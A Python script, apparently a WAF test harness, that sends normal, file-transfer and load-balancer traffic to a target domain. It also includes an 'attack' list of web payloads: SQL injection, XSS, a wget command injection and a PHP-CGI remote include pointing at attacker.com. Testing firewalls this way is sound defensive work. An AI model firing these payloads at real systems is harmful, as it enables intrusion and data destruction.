import os.path
import sys
import urllib3
import json
import inspect
import traceback
import multithread
from alive_progress import alive_bar
from logger_setter import set_logger, info_handler, error_handler
from send_helper import requests_sender, curl_sender, create_temp, delete_temp
from my_enum import Method

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# num=13
attack_url_list = ['/bot',
                   '/rootkit.php',
                   '/test.php?path=%3Bwget%20http://malicious-domain/hack.php',
                   '/cgi-bin/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://attacker.com/evilcode.txt',
                   '/stacked?a = 1; drop table b;',
                   '/embedded?a = 1 and (select * from b where 1=1)',
                   '/condition?a = 1 or 1 = 1',
                   '/arithmetic?a = 1*1*1*1',
                   '/sqlfunction?a = MOD(x,y)',
                   '/tag?a=<input onfocus=write(1) autofocus>',
                   '/attribute?id=1 onload="alert(0)"',
                   '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
                   '/jsfunction?a=function test(){A=alert;A(1)}']


def visit_attack_slow(prefix, repeat_num=1):
    logger = set_logger(inspect.stack()[0][3])
    mode_name = "Attack-slow"
    logger.info("<%s> mode, Domain: %s, repeat [%s] times" % (mode_name, prefix, repeat_num))
    with alive_bar(repeat_num * len(attack_url_list)) as bar:
        for index in range(repeat_num):
            for url in attack_url_list:
                headers = {}
                if url == "/bot":
                    headers['User-Agent'] = 'Cgichk'
                elif url == "/rootkit.php":
                    headers['X_File'] = 'data.txt'

                try:
                    code, waf_ip, _, _ = requests_sender(prefix, url, headers=headers)  # GET
                    logger.info(info_handler(url, code, index))
                except Exception as e:
                    # traceback.print_exc()
                    logger.error(error_handler(url, e, index))
                finally:
                    bar()


def visit_attack_fast(prefix, repeat_num=1, thread_num=5):
    """
    <multithread.requestNode> parameter:
        self, url='/', para='', method=Method.GET, repeat_id=0,
                 src_ip=None, agent=None, host=None, region=None, env_mode=False

    <multithread.threads_run> parameter:
        prefix, request_list=[], repeat_num=1, thread_num=10, logger=None
    """
    logger = set_logger(inspect.stack()[0][3])
    mode_name = "Attack-fast"
    logger.info("<%s> mode, Domain: %s, repeat [%s] times, with [%s] threads"
                % (mode_name, prefix, repeat_num, thread_num))

    nodelist = []
    for url in attack_url_list:
        nodelist.append(multithread.requestNode(url))
    multithread.threads_run(prefix, request_list=nodelist, repeat_num=repeat_num, thread_num=thread_num, logger=logger)


def visit_slow(prefix, url, method=Method.GET, repeat_num=1, func_name=None, postfile_path=None):
    if func_name is None:
        logger = set_logger(inspect.stack()[0][3])
        mode_name = "Normal"
    elif postfile_path is None:  # used for get_file mode
        logger = set_logger(func_name)
        mode_name = "Get_file"
    else:  # used for post_file mode
        logger = set_logger(func_name)
        mode_name = "Post_file"

    logger.info("<%s> mode, Domain: %s, repeat [%s] times." % (mode_name, prefix + url, repeat_num))
    response_size = None
    request_size = None
    with alive_bar(repeat_num) as bar:
        for index in range(repeat_num):
            try:
                if func_name is None:  # normal mod
                    code, waf_ip, _, _ = requests_sender(prefix, url, method=method)  # GET
                elif postfile_path is None:  # get_file mod
                    code, waf_ip, response_size, _ = requests_sender(prefix, url,
                                                                     method=Method.GET)  # GET
                else:  # post_file mod
                    method = Method.POST
                    code, waf_ip, response_size, request_size = requests_sender(prefix, url,
                                                                                method=Method.POST,
                                                                                postfile_path=postfile_path)  # POST
                logger.info(info_handler(url, code, index,
                                         method=method,
                                         waf_ip=waf_ip,
                                         response_size=response_size,
                                         request_size=request_size))
            except Exception as e:
                # traceback.print_exc()
                logger.error(error_handler(url, e, index,
                                           method=method))
            finally:
                bar()


def visit_fast(prefix, url, method=Method.GET, repeat_num=1, thread_num=5):
    """
    <multithread.requestNode> parameter:
        self, url='/', para='', method=Method.GET, repeat_id=0,
                 src_ip=None, agent=None, host=None, region=None, env_mode=False

    <multithread.threads_run> parameter:
        prefix, request_list=[], repeat_num=1, thread_num=10, logger=None
    """
    logger = set_logger(inspect.stack()[0][3])
    mode_name = "Fast"
    logger.info("<%s> mode, Domain: %s, repeat [%s] times, with [%s] threads"
                % (mode_name, prefix + url, repeat_num, thread_num))

    node = multithread.requestNode(url, method=method)
    multithread.threads_run(prefix, request_list=[node], repeat_num=repeat_num, thread_num=thread_num, logger=logger)


def visit_env_slow(prefix, url, env_name, repeat_num=1, func_name=None, postfile_path=None):
    dir_name = create_temp()
    if func_name is None:
        logger = set_logger(inspect.stack()[0][3])
        mode_name = "Env-slow"
    elif postfile_path is None:  # used for get_file-env mode
        logger = set_logger(func_name)
        mode_name = "Get_file-env"
    else:  # used for post_file-env mode
        logger = set_logger(func_name)
        mode_name = "Post_file-env"

    logger.info("<%s> mode, Domain: %s, repeat [%s] times, runs on [%s] env regions"
                % (mode_name, prefix + url, repeat_num, env_name))

    ips, regions = get_lb(logger, env_name)
    response_size = None
    request_size = None
    with alive_bar(repeat_num * len(ips)) as bar:
        for index in range(repeat_num):
            for ip_pos, ip in enumerate(ips):
                try:
                    if func_name is None:
                        method = Method.GET      # env mod
                        code, waf_ip, _, _ = curl_sender(dir_name, prefix, url, ip)  # GET
                    elif postfile_path is None:  # get_file-env mod
                        method = Method.GET
                        code, waf_ip, response_size, _ = curl_sender(dir_name, prefix, url, ip)  # GET
                    else:                        # post_file-env mod
                        method = Method.POST
                        code, waf_ip, response_size, request_size = curl_sender(dir_name, prefix, url, ip,
                                                                                postfile_path=postfile_path)  # POST

                    logger.info(info_handler(url, code, index,
                                             method=method,
                                             waf_ip=waf_ip,
                                             region=regions[int(ip_pos / 2)],
                                             response_size=response_size,
                                             request_size=request_size))
                except Exception as e:
                    # traceback.print_exc()
                    logger.error(error_handler(url, e, index,
                                               method=method,
                                               region=regions[int(ip_pos / 2)]))
                finally:
                    bar()
    delete_temp(dir_name)


def visit_env_fast(prefix, url, env_name, repeat_num=1, thread_num=5):
    """
    <multithread.requestNode> parameter:
        self, url='/', para='', method=Method.GET, repeat_id=0,
                 src_ip=None, agent=None, host=None, region=None, env_mode=False

    <multithread.threads_run> parameter:
        prefix, request_list=[], repeat_num=1, thread_num=10, logger=None
    """
    dir_name = create_temp()
    logger = set_logger(inspect.stack()[0][3])
    mode_name = "Env-fast"
    logger.info("<%s> mode, Domain: %s, repeat [%s] times, with [%s] threads, runs on [%s] env regions"
                % (mode_name, prefix + url, repeat_num, thread_num, env_name))

    ips, regions = get_lb(logger, env_name)
    nodelist = []
    for ip_pos, ip in enumerate(ips):
        node = multithread.requestNode(url, src_ip=ip, region=regions[int(ip_pos / 2)], env_mode=True)
        nodelist.append(node)
    multithread.threads_run(prefix, request_list=nodelist, repeat_num=repeat_num, thread_num=thread_num, logger=logger, temp_dir=dir_name)
    delete_temp(dir_name)


def get_file(prefix, get_size=1, repeat_num=1):
    url = "/file?size=%s&unit=mb" % get_size
    visit_slow(prefix, url, repeat_num=repeat_num, func_name=inspect.stack()[0][3])


def get_file_env(prefix, env_name, get_size=1, repeat_num=1):
    url = "/file?size=%s&unit=mb" % get_size
    visit_env_slow(prefix, url, env_name, repeat_num=repeat_num, func_name=inspect.stack()[0][3])


def post_file(prefix, post_size=1, repeat_num=1):
    url = "/file?size=%s&unit=mb" % post_size
    post_file_path = "file.txt"
    creat_file(post_file_path, post_size, "mb")
    visit_slow(prefix, url, repeat_num=repeat_num, func_name=inspect.stack()[0][3], postfile_path=post_file_path)
    delete_file(post_file_path)


def post_file_env(prefix, env_name, post_size=1, repeat_num=1):
    url = "/file?size=%s&unit=mb" % post_size
    post_file_path = "file.txt"
    creat_file(post_file_path, post_size, "mb")
    visit_env_slow(prefix, url, env_name, repeat_num=repeat_num, func_name=inspect.stack()[0][3], postfile_path=post_file_path)
    delete_file(post_file_path)


################## helper functions
def get_lb(logger, env_name):
    with open("lb_info.json", 'r') as f:
        try:
            data = json.load(f)
            if env_name not in data:
                raise Exception
        except json.decoder.JSONDecodeError as e:
            logger.error("lb_info.json loading failed!", e)
            sys.exit(0)
        except Exception:
            logger.error("[%s] env not found!" % env_name)
            sys.exit(0)
    return data[env_name]["lb-ip"], data[env_name]["lb-region"]


def creat_file(file_path, size, unit):
    size = int(size)
    with open(file_path, "w") as f:
        if str.lower(unit) == 'kb':
            size *= 1024 - 1
        elif str.lower(unit) == 'mb':
            size *= 1024 * 1024 - 1
        f.seek(size)
        f.write('end')


def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)
